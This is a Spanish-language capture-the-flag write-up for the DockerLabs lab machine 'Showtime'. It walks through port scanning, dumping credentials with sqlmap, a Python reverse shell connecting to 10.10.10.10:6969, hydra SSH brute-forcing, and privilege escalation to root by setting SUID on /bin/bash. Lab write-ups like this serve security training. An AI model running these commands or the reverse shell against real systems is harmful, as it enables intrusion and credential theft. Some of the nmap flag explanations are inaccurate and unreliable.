# Showtime

# Enumeración

Empezamos con un escaneo de los puertos.

`sudo nmap -p- --open -sC -sS -sV --min-rate=5000 -n -Pn -vvv 172.17.0.2 -oN Balulero`  

- `-p-` : Todos los puertos
- `--open` : Todos los puertos abiertos
- `-sC` : Escaneo de todos los scripts
- `-sS` : Escaneo de todos los servicios
- `-sV` : Escaneo de todas las versiones de los servicios
- `--min-rate 5000` : Establece mínimo envío de paquetes mínimos 5000/s
- `-n` : No aplica resolución DNS
- `-Pn` : Omisión de detección de hosts
- `-vvv` : Verbose - Muestra toda la información

# Resultado escaneo  

Tenemos 2 puertos abiertos, el 22 y el 80.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_1.jpg)    

Abrimos la web y en la home no encontramos nada interesante.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_2.jpg)     

Vemos que hay un enlace a Login y lo abrimos y vemos que nos encontramos un panel de autenticacíon.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_3.jpg)    

Utilizaremos la herramienta **sqlmap** para intentar extrapolar usernames y password.  
Ejecutaremos el comando:  

`sudo sqlmap -u http://172.17.0.2/login_page/index.php --forms --dbs --batch`  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_4.jpg)    

Ahora damos el comando:  

`sudo sqlmap -u http://172.17.0.2/login_page/index.php --forms -D users --tables --batch`  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_5.jpg)      

Seguimos la enumeración digitando:  

`sudo sqlmap -u http://172.17.0.2/login_page/index.php --forms -D users -T usuarios --columns --batch`  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_6.jpg)     

Y por último:  

`sudo sqlmap -u http://172.17.0.2/login_page/index.php --forms -D users -T usuarios -C username,password -dump --batch`  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_7.jpg)      

Perfecto!  
Tenemos 3 usuarios con sus relativas contraseñas.  

Probamos a logearnos pero solamente con el usaurio joe podemos acceder a un panel que nos permite ejecutar comandos python.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_8.jpg)       

Ahora probamos a ver si funciona.  
Ejecutamos este comando:  

```
import os  
os.system ("ls")
```
![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_9.jpg)    

Perfecto, parece funcionar.  
Ahora lo que podemos intentar hacer es lanzarnos una reverse shell hacía nuestra maquina kali.
Nos pondremos a la escucha en en puerto 6969 de la nuestra kali y ejecutaremos el comando `nc -lvnp 6969`.   
Ahora ejecutaremo este cógido en el panel:  

```
import socket
import os
import subprocess

# Configura l'IP e la porta di destinazione
ip = "10.10.10.10"
port = 6969

# Crea il socket e connettiti al server
s = socket.socket()
s.connect((ip, port))

# Reindirizza stdin, stdout, stderr al socket
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

# Esegui la shell
subprocess.call("/bin/sh")
```
![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_10.jpg)    

Perfecto!  
Hemos obtenido una reverse shell.  
Ahora le aplicamos un tratamiento para poder trabajar más comodos.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_11.jpg)  

Probamos a dar los tipicos comandos para intentar escalar de privilegios, pero no vemos nada interesante.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_12.jpg)   

Entonces subimos el archivo linpeas.sh a la maquina victima.  
Para ello nos montamos un server http en la nuesta maquina kali con el comando:  
`sudo python3 -m http.server` y posteriormente descargamos el archivo en la maquina victima.  
Le damos los permisos de ejecucíon con el comando `chmod +x` y lo ejecutamos.  
Analizandolo todo vemos que hay un archivo oculto en la carpeta /tmp que se llama **.hidden_text.txt**  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_13.jpg)    

Lo abrimos y vemos que contiene una serie de palabras todas en mayusculas.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_14.jpg)   

Jugando con la imaginacíon podemos pensar que esto podría ser un listado de probables contraseña. 
Probamos a crear un diccionario pero vemos que con hydra no logramos sacar la contraseña.  
Una otra cosa que podemos hacer es convertir con **tr** todas las palabras de mayusculas a minusculas.  
Para ello utilizamos el siguiente comando:  

`cat pass.txt | tr '[:upper:]' '[:lower:]' > password.txt`  

Y ahora intentamos otra vez con hydra para ver si sacamos algo que nos pueda servir.  
Ejecutamos el comando:  

`sudo hydra -L users.txt -P password.txt ssh://172.17.0.2/`  y listo, conseguimos una contraseña valida pare el usuario joe.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_15.jpg)     

Ahora nos conectamos con el usuario joe y lanzamos el comando:  

`sudo -l`  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_16.jpg)     

Miramos en GTFOBins si podemos aprovechar de este binario y parece que sí.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_17.jpg)      

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_18.jpg)    

Perfecto, ya hemos podido escalar a otro usuario.  
Lanzamos otra vez el comando `sudo -l`  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_19.jpg)     

Echamos un ojo a lo script en la carpeta de luciano.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_20.jpg)      

Ok, lo que haremos será modificarlo para poder escalar a root.  
Vemos que no podemos utilizar ni el editor nano ni el vim.  
Por lo tanto lo que haremos será utilizar el comando **echo**.  
Lanzaremos el comando:  

`echo -e '#!/bin/bash \n chmod u+s /bin/bash' > .script.sh`  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_21.jpg)    

Perfecto, ahora ejecutaremos el comando `sudo /bin/bash /home/luciano/script.sh` y luego el comando `bash -p`  y listo!  
Ya somos root!  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_22.jpg)    













